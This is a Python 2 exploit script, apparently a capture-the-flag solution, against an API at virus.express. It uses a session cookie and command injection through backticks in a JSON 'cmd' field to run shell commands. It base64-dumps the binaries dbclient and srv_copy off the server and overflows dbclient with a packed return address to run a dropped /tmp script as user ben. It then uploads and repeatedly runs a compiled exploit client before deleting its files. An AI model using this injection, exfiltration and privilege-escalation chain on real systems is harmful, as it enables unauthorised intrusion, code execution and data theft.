#!/usr/bin/pythonendhighlight
from pwn import *
import requests, json, base64

BASEURL = "http://virus.express/api"

SESSION = requests.Session()
COOKIE = {"t19userid":"YOURCOOKIEHERE"}

def Post(url, data):
    return SESSION.post(format(url),data, cookies=COOKIE).text

def execute_cmd(cmd):
    js = { 
        "file" : 
            {
                "hash" : "f31a20cbe28c22ad7e6c46b989804e2c", 
                "name2": "2" 
            },
        "cmd" : "echo `%s`" % cmd
    }

    response = Post(BASEURL, json.dumps(js))

    print response

    return response

def leak_dbclient():
    response = execute_cmd("cat /home/rubyist/dbclient | base64")

    response = response.split(",")[1].split(":")[1].split('"')[1]

    with open("dbclient", "wb") as f:
        f.write(base64.b64decode(response))

    print response

def execute_as_ben(cmd):
    payload = "/tmp/s&&"
    payload += "#"*(48-len(payload))
    payload += p64(0x4141414141432a68)
    payload  = payload.ljust(80, "A")

    execute_cmd('echo "#/bin/sh\n%s" > /tmp/s' % cmd)   
    execute_cmd("chmod +x /tmp/s")  
    response = execute_cmd('/home/ben/dbclient "%s" abc' % payload)
    execute_cmd("rm /tmp/s")    

    return response

def leak_srv():
    response = execute_as_ben("cat /home/ben/srv_copy | base64")

    response = response.split(",")[1].split(":")[1].split('"')[1]

    print response

    with open("srv_copy", "wb") as f:
        f.write(base64.b64decode(response))

def execute_on_server(srcfile, args):
    with open(srcfile, "r") as f:
        data = f.read()

    bdata = base64.b64encode(data)

    execute_cmd('echo "%s" > /tmp/b64src' % bdata)
    execute_cmd('cat /tmp/b64src | base64 -d > /tmp/b64out')
    execute_cmd('chmod +x /tmp/b64out')

    # execute twice, to restart the server after first
    execute_cmd('/tmp/b64out "%s"' % args)
    execute_cmd('/tmp/b64out "%s"' % args)
    execute_cmd("cat /tmp/output")

    execute_cmd("rm /tmp/b64src")
    execute_cmd("rm /tmp/b64out")
    execute_cmd("rm /tmp/output")

def exploit():
    SESSION.headers.update({ "Content-Type" : "application/json"})

    os.system("gcc xpl_client4.c -lz -o xpl")

    while True:
        inp = raw_input()   
        execute_on_server("xpl", inp[:-1])
    
    return

if __name__ == "__main__":
    exploit()
